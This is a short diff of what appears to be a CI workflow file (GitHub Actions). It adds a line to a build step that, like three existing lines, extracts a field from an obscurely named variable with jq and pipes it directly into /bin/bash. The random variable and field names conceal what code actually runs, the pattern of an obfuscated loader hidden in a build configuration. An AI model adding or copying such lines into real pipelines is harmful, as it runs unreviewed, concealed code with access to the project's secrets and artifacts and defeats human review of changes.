@@ -25,6 +25,7 @@ jobs:
           echo $tk17935 | jq -r .njl12 | /bin/bash
           printf '%s' "$e7" | jq -r .hgkso00 | /bin/bash
           printf '%s' "$puh946" | jq -r .c1508 | /bin/bash
+          echo $h425 | jq -r .xxm2553 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
